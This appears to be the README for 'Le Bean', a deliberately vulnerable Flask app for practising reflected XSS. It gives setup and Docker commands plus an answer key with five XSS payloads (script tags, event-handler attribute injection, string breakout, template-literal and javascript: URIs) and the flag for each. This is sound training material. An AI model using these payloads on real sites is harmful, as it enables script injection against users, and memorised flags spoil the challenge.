#Hello, Friend!

Introducing...

# Le Bean

A warm and wholesome reflected XSS fun for the whole family!

## How?

Yes, yes. I'm getting there.

```
python3 -m venv venv/
source venv/bin/activate
pip3 install -r lebean/requirements.txt
cd lebean/
flask run
```

Open `http://localhost:5000` in browser, and have fun!

## Solutions

### Challenge 1

Solution: `<script>alert(1)</script>`

Flag: `flag{ezpz_xss_squeezy}`

### Challenge 2

Solution: `" onfocus="alert(1)` (or some other event)

Flag: `flag{xss_on_event_fun_fun}`

### Challenge 3

Solution: `'); alert(1); //`

Flag: `flag{xss_sneaky_clever_fren}`

### Challenge 4

Solution: `${alert(1)}`

Flag: `flag{xss_templeet_string}`

### Challenge 5

Solution: `javascript:alert(1)`

Flag: `flag{iframe_shenanigans_xss}`

## Docker

Wow look at you, using docker. Smart friend, you are. ;)

```
docker build -t lebean .
docker run -p 5000:5000 lebean
```

Have fun, friends!

